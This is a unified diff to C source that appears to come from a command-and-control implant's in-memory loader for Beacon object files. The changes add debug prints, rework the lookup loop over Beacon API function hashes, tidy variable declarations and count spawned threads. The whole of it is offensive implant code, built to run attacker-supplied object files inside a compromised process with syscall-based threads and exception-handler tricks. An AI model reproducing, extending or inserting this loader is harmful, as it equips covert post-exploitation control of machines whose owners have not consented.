@@ -51,7 +51,12 @@ PVOID CoffeeProcessSymbol( LPSTR Symbol )
     ANSI_STRING AnsiString  = { 0 };
     PPACKAGE    Package     = NULL;
 
-    PRINTF( "Symbol: %s\n", Symbol )
+    PRINTF(
+        "Symbol:         \n"
+        " - String: %s   \n"
+        " - Hash  : %lx  \n",
+        Symbol, SymHash
+    )
 
     MemCopy( Bak, Symbol, StringLengthA( Symbol ) + 1 );
 
@@ -65,10 +70,16 @@ PVOID CoffeeProcessSymbol( LPSTR Symbol )
         PUTS( "Internal Function" )
         SymFunction = Symbol + COFF_PREP_SYMBOL_SIZE;
 
-        for ( DWORD i = 0; i < BeaconApiCounter; i++ )
+        for ( DWORD i = 0 ;; i++ )
         {
+            if ( ! BeaconApi[ i ].NameHash )
+                break;
+
             if ( HashStringA( SymFunction ) == BeaconApi[ i ].NameHash )
+            {
+                PUTS( "Found Beacon api function" )
                 return BeaconApi[ i ].Pointer;
+            }
         }
 
         goto SymbolNotFound;
@@ -127,9 +138,9 @@ VOID CoffeeFunction( PVOID Address, PVOID Argument, SIZE_T Size )
 
 BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE_T Size )
 {
-    BOOL  Success       = FALSE;
-    PVOID CoffeeMain    = NULL;
-    PVOID VehHandle     = NULL;
+    PVOID CoffeeMain = NULL;
+    PVOID VehHandle  = NULL;
+    BOOL  Success    = FALSE;
 
     if ( Instance->Config.Implant.CoffeeVeh )
     {
@@ -142,7 +153,6 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
             return FALSE;
         }
     }
-
 
     for ( DWORD SymCounter = 0; SymCounter < Coffee->Header->NumberOfSymbols; SymCounter++ )
     {
@@ -327,6 +337,8 @@ DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSiz
 {
     COFFEE Coffee = { 0 };
 
+    PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )
+
     if ( ! CoffeeData )
     {
         PUTS( "[!] Coffee data is empty" );
@@ -343,7 +355,7 @@ DWORD CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSiz
     {
         Coffee.Section               = U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt );
         Coffee.SecMap[ SecCnt ].Size = Coffee.Section->SizeOfRawData;
-        Coffee.SecMap[ SecCnt ].Ptr  = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee.SecMap[ SecCnt ].Size, PAGE_READWRITE ); // VirtualAlloc( NULL, Coffee.SecMap[ SecCnt ].Size, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
+        Coffee.SecMap[ SecCnt ].Ptr  = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee.SecMap[ SecCnt ].Size, PAGE_READWRITE );
 
         MemCopy( Coffee.SecMap[ SecCnt ].Ptr, U_PTR( CoffeeData ) + Coffee.Section->PointerToRawData, Coffee.Section->SizeOfRawData );
     }
@@ -431,6 +443,8 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
     MemCopy( CoffeeParams->ArgData,    ArgData,    ArgSize        );
 
     InjectionCtx.Parameter = CoffeeParams;
+
+    Instance->Threads++;
 
     if ( ! ThreadCreate( DX_THREAD_SYSCALL, NtCurrentProcess(), CoffeeRunnerThread, &InjectionCtx ) )
     {
